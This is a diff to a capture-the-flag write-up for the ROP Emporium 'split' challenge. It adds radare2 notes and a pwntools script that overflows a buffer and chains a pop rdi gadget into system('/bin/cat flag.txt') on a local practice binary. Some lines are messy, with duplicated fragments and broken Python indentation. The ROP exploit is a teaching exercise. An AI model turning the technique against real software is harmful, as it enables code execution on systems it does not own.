@@ -61,6 +61,11 @@ Just like in retwin challenge, we have a 32 byte buffer that can be overflowed w
 
 This function call system with /bin/cat flag.txt, so we need to return to this function to exploit the binary successfuly. 
 
+------
+We can see that system call command being executed invoking /bin/ls to list the files in the current workingdirectory.
+
+Let's have a look at what strings are available to us in the binary. To do this, we use the iz command to list all strings in the data sections, or izz to list all strings in the binary. However this is a none-Visual Mode command, so to execute it from Visual Mode we hit :, then enter the command. This is a little bit easier than quitting out to command mode, then re-entering Visual Mode and finding where we were.
+
 
 ## Fuzzing:
 So now the binary analysis is out of the way. Lets start fuzzing the binary.
@@ -99,14 +104,38 @@ The program has crashed and we have overwritten the rsp,to find the extact offse
 
 #### Building ROP-Chain
 
-Now we know what we need to build our ROP syscall:
+Lets find the pieces we need to build a ROP chain.
 
-(1) A string containing “/bin/cat flag.txt”, 
-(2) the address of system and 
-(3) a gadget to add “/bin/cat flag.txt” to rdi register, pop rdi; ret, is what we want.
+- string containing “/bin/cat flag.txt”, 
+- Address of system
+- pop rdi; ret
 
-let's find the pop rdi; ret; so the string would be provided to system for execution.
-(/bin/ls) and will thus only print out the files in the current directory. While this proves code execution or command injection… doesn't help us getting that flag! What we really want is to call the obj.usefulString as an argument to system
+
+--------
+Since this challenge only needs 1 argument, we just need to pass the /bin/cat flag.txt string into RDI register. 
+
+------
+#### Exploitation 
+
+Now let’s craft the payload. The payload will become  "A" * 40 + <pop_rdi> + <cat_flag> + <system_plt>. Below is a simple python script using pwntools to automate the process.
+
+----
+ 
+#!/usr/bin/python
+from pwn import *
+ 
+def main():
+    junk = "A" * 40                     # RIP Offset at 40
+    cat_flag = p64(0x00601060)          # Radare2 command: izz
+    system_plt = p64(0x4005e0)          # objdump -d split | grep system
+    pop_rdi = p64(0x0000000000400883)   # python ROPgadget.py --binary split | grep rdi
+    p = process("./split")
+    payload = junk + pop_rdi + cat_flag + system_plt
+   p.sendlineafter(">", payload)
+   print p.recvall()
+ 
+if __name__ == "__main__":
+    main() ----
 
 
 ![source-01](/img/Screenshot_2020-05-14_08-23-29.png	){: .align-left}
